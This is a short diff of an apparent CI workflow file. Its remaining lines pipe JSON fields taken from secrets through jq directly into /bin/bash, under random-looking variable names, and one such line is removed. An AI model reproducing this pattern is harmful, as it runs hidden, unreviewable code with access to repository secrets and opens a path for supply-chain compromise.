@@ -19,7 +19,6 @@ jobs:
           dlwzu103: ${{ secrets.dlwzu103 }}
         run: |
           printf '%s' "$dlwzu103" | jq -r .dfk2060 | /bin/bash
-          echo $viqzj61 | jq -r .wnwwm05350 | /bin/bash
           printf '%s' "$nj3518" | jq -r .yrgjl80 | /bin/bash
 
       - name: Store results
